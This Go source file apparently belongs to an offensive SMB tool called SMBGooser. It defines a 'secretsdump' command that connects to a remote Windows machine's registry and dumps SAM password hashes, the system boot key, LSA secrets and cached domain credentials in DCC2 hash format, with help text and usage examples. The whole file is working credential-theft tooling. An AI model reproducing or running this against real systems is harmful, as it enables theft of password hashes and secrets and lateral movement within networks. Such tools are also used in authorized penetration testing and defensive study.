package main

import (
	"context"
	"fmt"
	"strings"

	"github.com/ineffectivecoder/SMBGooser/pkg/secrets"
)

func init() {
	commands.Register(&Command{
		Name:        "secretsdump",
		Aliases:     []string{"sam", "dump"},
		Description: "Dump SAM hashes and LSA secrets from remote machine",
		Usage:       "secretsdump [--sam-only] [--lsa-only]",
		Handler:     cmdSecretsDump,
	})
}

// cmdSecretsDump extracts secrets from the remote machine
func cmdSecretsDump(ctx context.Context, args []string) error {
	if client == nil || session == nil {
		return fmt.Errorf("not connected")
	}

	// Default: dump everything
	dumpLSA := true
	dumpSAM := true

	for _, arg := range args {
		switch arg {
		case "help":
			printSecretsDumpHelp()
			return nil
		case "--sam-only", "-s":
			dumpLSA = false
		case "--lsa-only", "-l":
			dumpSAM = false
		}
	}

	info_("Connecting to remote registry...")
	dumper, err := secrets.NewDumper(ctx, client)
	if err != nil {
		return fmt.Errorf("failed to create dumper: %w", err)
	}
	defer dumper.Close()

	info_("This requires admin privileges and backup rights")

	// Dump SAM hashes
	if dumpSAM {
		info_("Dumping SAM hashes...")
		hashes, err := dumper.DumpSAM(ctx)
		if err != nil {
			warn_("SAM dump failed: %v", err)
		} else {
			fmt.Println()
			// Display boot key
			if bootKey := dumper.BootKey(); len(bootKey) > 0 {
				fmt.Printf("  %sTarget system boot key: 0x%x%s\n", colorGreen, bootKey, colorReset)
				fmt.Println()
			}
			fmt.Printf("  %sSAM Hashes:%s\n", colorBold, colorReset)
			fmt.Println("  " + strings.Repeat("-", 60))
			for _, h := range hashes {
				fmt.Printf("  %s\n", secrets.FormatHash(h))
			}
			fmt.Println()
		}
	}

	// Dump LSA secrets
	if dumpLSA {
		info_("Dumping LSA secrets...")
		lsaSecrets, cachedCreds, err := dumper.DumpLSA(ctx)
		if err != nil {
			warn_("LSA dump failed: %v", err)
		} else {
			// Print LSA secrets
			if len(lsaSecrets) > 0 {
				fmt.Println()
				fmt.Printf("  %sLSA Secrets:%s\n", colorBold, colorReset)
				fmt.Println("  " + strings.Repeat("-", 60))
				for _, s := range lsaSecrets {
					fmt.Printf("  %s%-20s%s %s\n", colorGreen, s.Name, colorReset, s.Secret)
				}
			}

			// Print cached credentials
			if len(cachedCreds) > 0 {
				fmt.Println()
				fmt.Printf("  %sCached Credentials (DCC2):%s\n", colorBold, colorReset)
				fmt.Println("  " + strings.Repeat("-", 60))
				for _, c := range cachedCreds {
					fmt.Printf("  %s\\%s:$DCC2$10240#%s#%s\n", c.Domain, c.Username, c.Username, c.Hash)
				}
			}
			fmt.Println()
		}
	}

	success_("Secrets dump complete")
	return nil
}

func printSecretsDumpHelp() {
	fmt.Println("\nUsage: secretsdump [options]")
	fmt.Println("\nDumps SAM password hashes and LSA secrets from the remote machine.")
	fmt.Println("By default, dumps everything (SAM + LSA).")
	fmt.Println("Requires admin privileges on the target.")
	fmt.Println("\nOptions:")
	fmt.Println("  --sam-only, -s   Only dump SAM hashes")
	fmt.Println("  --lsa-only, -l   Only dump LSA secrets")
	fmt.Println("\nExamples:")
	fmt.Println("  secretsdump            # Dump SAM + LSA (default)")
	fmt.Println("  secretsdump --sam-only # SAM hashes only")
	fmt.Println("  secretsdump --lsa-only # LSA secrets only")
	fmt.Println("\nAliases: sam, dump")
	fmt.Println()
}
